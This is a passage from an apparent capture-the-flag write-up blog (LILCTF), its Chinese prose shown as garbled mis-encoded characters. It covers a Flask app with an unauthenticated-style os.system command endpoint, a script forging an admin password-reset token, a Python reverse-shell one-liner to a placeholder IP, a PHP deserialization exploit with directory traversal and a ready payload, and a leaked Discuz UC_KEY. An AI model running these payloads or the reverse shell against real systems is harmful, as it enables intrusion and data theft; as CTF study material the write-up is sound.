</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;æˆåŠŸé‡ç½®å¯†ç ï¼è¯·é‡æ–°ç™»å½•&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;æ— æ•ˆæˆ–è¿‡æœŸçš„token&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;reset_password&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;reset_password.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/execute_command&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_command</span>():
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> check_time_api()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#34;APIæ­»äº†å•¦ï¼Œéƒ½ä½ å®³çš„å•¦ã€‚&#34;</span>, <span style="color:#e6db74">&#34;danger&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;dashboard&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> result:
</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#39;2066å¹´æ‰å®Œå·¥å“ˆï¼Œä½ å¯ä»¥ç©¿è¶Šåˆ°2066å¹´çœ‹çœ‹&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;dashboard&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        command <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(command) <span style="color:#75715e"># ä»€ä¹ˆï¼Ÿä½ è¯´å®‰å…¨ï¼Ÿä¸æ˜¯ï¼Œéƒ½è¯´äº†è¿˜æ²¡å®Œå·¥å‚¬ä»€ä¹ˆã€‚</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;execute_command&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;execute_command.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/admin/settings&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@admin_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_settings</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>get(session[<span style="color:#e6db74">&#39;user_id&#39;</span>])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        new_api <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;time_api&#39;</span>)
</span></span><span style="display:flex;"><span>        user<span style="color:#f92672">.</span>time_api <span style="color:#f92672">=</span> new_api
</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#39;æˆåŠŸæ›´æ–°APIï¼&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;admin_settings&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;admin_settings.html&#39;</span>, time_api<span style="color:#f92672">=</span>user<span style="color:#f92672">.</span>time_api)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
</span></span></code></pre></div><p>å®ç°äº†åŸºæœ¬çš„æ³¨å†Œï¼Œç™»å½•ï¼Œå¿˜è®°å¯†ç ç­‰åŠŸèƒ½ï¼Œä¸»è¦æ¼æ´å‡ºåœ¨å¿˜è®°å¯†ç çš„éƒ¨åˆ†ï¼Œä½¿ç”¨äº†uuid.uuid8æ¥ç”Ÿæˆtokenï¼Œè€Œå…¶ä¸­è°ƒç”¨äº†randomç”Ÿæˆäº†ä¼ªéšæœºæ•°ï¼Œé¢˜ç›®è¿˜ç»™äº†<code>/server_info</code>æ¥è·å–æ—¶é—´æˆ³<code>SERVER_START_TIME</code>ï¼Œadminç”¨æˆ·åã€é‚®ç®±ä»¥åŠpaddingç®—æ³•éƒ½åœ¨æºç ä¸­ï¼Œåªè¦æ¨¡æ‹Ÿç”Ÿæˆä¸€æ¬¡tokenå°±å¯ä»¥å®ç°ä¿®æ”¹adminçš„å¯†ç å®ç°è¶Šæƒï¼Œèµ·ä¸€ä¸ªpython3.14çš„ç¯å¢ƒå°±èƒ½è·å–åˆ°uuid.uuid8äº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secrets <span style="color:#f92672">import</span> token_urlsafe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding</span>(input_string):
</span></span><span style="display:flex;"><span>    byte_string <span style="color:#f92672">=</span> input_string<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(byte_string) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">6</span>: byte_string <span style="color:#f92672">=</span> byte_string[:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>    padded_byte_string <span style="color:#f92672">=</span> byte_string<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">6</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    padded_int <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(padded_byte_string, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> padded_int
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SERVER_START_TIME <span style="color:#f92672">=</span> <span style="color:#ae81ff">1755253132.849335</span>
</span></span><span style="display:flex;"><span>random<span style="color:#f92672">.</span>seed(SERVER_START_TIME)
</span></span><span style="display:flex;"><span>admin_super_strong_password <span style="color:#f92672">=</span> token_urlsafe()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> padding(<span style="color:#e6db74">&#34;admin&#34;</span>)
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> uuid<span style="color:#f92672">.</span>uuid8(a<span style="color:#f92672">=</span>a)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(token)
</span></span></code></pre></div><p>ç™»é™†æˆåŠŸåè€ƒè™‘å¦‚ä½•ä¿®æ”¹time_apiæ¥è®©date&gt;=2066ï¼Œå¯ä»¥ä½¿ç”¨åœ¨çº¿çš„è‡ªå®šä¹‰apiç½‘ç«™è‡ªå®šä¹‰è¿”å›jsonæ•°æ®ï¼Œhttps://app.beeceptor.com/ ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;date&#34;</span>:<span style="color:#e6db74">&#34;2066-01-01T00:00:00&#34;</span>}
</span></span></code></pre></div><p><code>/admin/settings</code>ä¸­å¡«å…¥è‡ªå®šä¹‰çš„apiï¼šhttps://lilctf.free.beeceptor.com/api/date ï¼Œå†è®¿é—®/execute_commandå³å¯å®ç°RCEã€‚ä½†æ˜¯ç”±äºæ‰§è¡Œçš„æ˜¯os.system()ï¼Œç½‘é¡µæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œå°è¯•åå¼¹shellï¼Œä¸€å¼€å§‹ç”¨bashå’Œncåå¼¹éƒ½å¤±è´¥äº†è¿˜ä»¥ä¸ºä¸å‡ºç½‘ï¼Œæœ€åå°è¯•pythonåå¼¹shellæˆåŠŸï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;your_ip&#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><p>flagåœ¨æ ¹ç›®å½•ä¸‹ï¼šLILCTF{U_HAvE_1OUnD_TH3_rIgH7_tlMEIINE!}</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://xz.aliyun.com/news/8987">https://xz.aliyun.com/news/8987</a></p>
<hr>
<h2 id="your-uns3r">Your Uns3r<a hidden class="anchor" aria-hidden="true" href="#your-uns3r">#</a></h2>
<p>index.phpï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $value;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exec</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">unserialize</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($ser <span style="color:#f92672">!=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">&amp;&amp;</span> $ser <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">Access</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">include</span>($ser<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getToken</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exec</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Access</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $prefix;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $suffix;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getToken</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prefix</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">suffix</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Go to HELL!&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prefix</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;lilctf&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">suffix</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($result, <span style="color:#e6db74">&#39;pearcmd&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Can I have peachcmd?&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $result;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ser <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;user&#34;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($ser, <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strpos</span>($ser, <span style="color:#e6db74">&#39;Access&#34;:&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span> (<span style="color:#e6db74">&#34;no way!!!!&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($ser);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;nonono!!!&#34;</span>);
</span></span></code></pre></div><hr>
<p>ååºåˆ—åŒ–çš„ç›®çš„æ˜¯å®ç°includeçš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥åˆ©ç”¨ç›®å½•ç©¿è¶Šï¼Œè®¾ç½®å¥½prefixå’Œsuffixå³å¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Access</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $suffix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../../../../../flag&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># include(&#34;/lilctf/../../../../../flag&#34;);
</span></span></span></code></pre></div><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ä¸€å®šä¼šå‡ºç°Accessï¼Œç¬¬ä¸€ä¸ªè¦ç»•è¿‡çš„å°±æ˜¯Userä¸­ä¸èƒ½è®¾ç½®usernameä¸ºadminï¼Œå¦åˆ™æ— æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯<code>__destruct()</code>åˆè¦æ±‚<code>$this-&gt;username == &quot;admin&quot;</code>ä¸ºçœŸæ‰æ‰§è¡Œ<code>exec()</code>ï¼Œå¯ä»¥åˆ©ç”¨trueçš„å¼±æ¯”è¾ƒç‰¹æ€§æ¥ç»•è¿‡ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;  <span style="color:#75715e"># trueä¸éç©ºå­—ç¬¦ä¸²è¿›è¡Œå¼±æ¯”è¾ƒè¿”å›true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $value;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>$ser = unserialize(serialize(unserialize($this-&gt;value)));</code>å’Œä¸‹é¢çš„åˆ¤æ–­<code>$ser != $this-&gt;value &amp;&amp; $ser instanceof Access</code>çœ‹ä¸Šå»æœ‰ç‚¹ç»•ï¼Œå®é™…ä¸ŠæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘ï¼Œ<code>$this-&gt;value</code>æ˜¯åºåˆ—åŒ–åçš„<code>ser</code>ï¼Œå³<code>serialize(new Access())</code>ï¼Œç¬¦åˆæ‰€æœ‰æ¡ä»¶ï¼Œæ ¹æœ¬æ²¡æœ‰ä»€ä¹ˆéœ€è¦ç»•è¿‡çš„åœ°æ–¹</p>
<p>æ­¤æ—¶å·²ç»èƒ½å†™å‡ºå®Œæ•´çš„expï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $value;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Access</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $suffix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../../../../../flag&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Access</span>();
</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($b);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> (<span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($a)));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>æœ€åè¿˜æœ‰ä¸€ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹ï¼Œ<code>throw new Exception(&quot;nonono!!!&quot;);</code>ä¼šåœ¨<code>__destruct()</code>è§¦å‘å‰å°±æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œææ„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•è¯»å–/flagï¼Œç›´æ¥å°†åºåˆ—åŒ–ç»“æœæœ€åçš„}åˆ å»å³å¯è§¦å‘fast_destructç»•è¿‡throwï¼š</p>
<pre tabindex="0"><code>user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A5%3A%22value%22%3Bs%3A84%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A1%3A%22%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B
</code></pre><p>LILCTF{90NNa_f1ND_y#UR_@NsW3r_7o_UNseR}</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a></p>
<hr>
<h2 id="æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ">æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ<a hidden class="anchor" aria-hidden="true" href="#æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ">#</a></h2>
<blockquote>
<p>flag åœ¨ pre_a_flag è¡¨é‡Œ</p></blockquote>
<p>Discuz! X3.5ï¼Œwww.zipæœ‰å¤‡ä»½æºç ï¼Œå…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹é…ç½®ç›®å½•configï¼Œæ ¹æ®ä¿®æ”¹æ—¶é—´æ’é™¤deafultä¸­åŒåçš„ä¿¡æ¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;UC_KEY&#39;</span>, <span style="color:#e6db74">&#39;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#39;</span>);	<span style="color:#75715e">// ä¸ UCenter çš„é€šä¿¡å¯†é’¥, è¦ä¸ UCenter ä¿æŒä¸€è‡´
</span></span></span></code></pre></div><p>é€šè¿‡UC_KEYå¯ä»¥è®¡ç®—_authcodeï¼Œdbbak.phpï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$timestamp <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($timestamp <span style="color:#f92672">-</span> $get[<span style="color:#e6db74">&#39;time&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3600</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;Authorization has expired&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($get[<span style="color:#e6db74">&#39;method&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;export&#39;</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#39;SET SQL_QUOTE_SHOW_CREATE=0&#39;</span>, <span style="color:#e6db74">&#39;SILENT&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;Y-m-d H:i:s&#34;</span>, $timestamp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$tables <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>	$tables <span style="color:#f92672">=</span> <span style="color:#a6e22e">arraykeys2</span>(<span style="color:#a6e22e">fetchtablelist</span>($tablepre), <span style="color:#e6db74">&#39;Name&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($apptype <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;discuz&#39;</span>) {
</span></span><span style="display:flex;"><span>		$query <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT datatables FROM </span><span style="color:#e6db74">{</span>$tablepre<span style="color:#e6db74">}</span><span style="color:#e6db74">plugins WHERE datatables&lt;&gt;&#39;&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span>($plugin <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_array</span>($query)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">foreach</span>(<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $plugin[<span style="color:#e6db74">&#39;datatables&#39;</span>]) <span style="color:#66d9ef">as</span> $table) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>($table <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($table)) {
</span></span><span style="display:flex;"><span>					$tables[] <span style="color:#f92672">=</span> $table;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($apptype <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;discuzx&#39;</span>) {
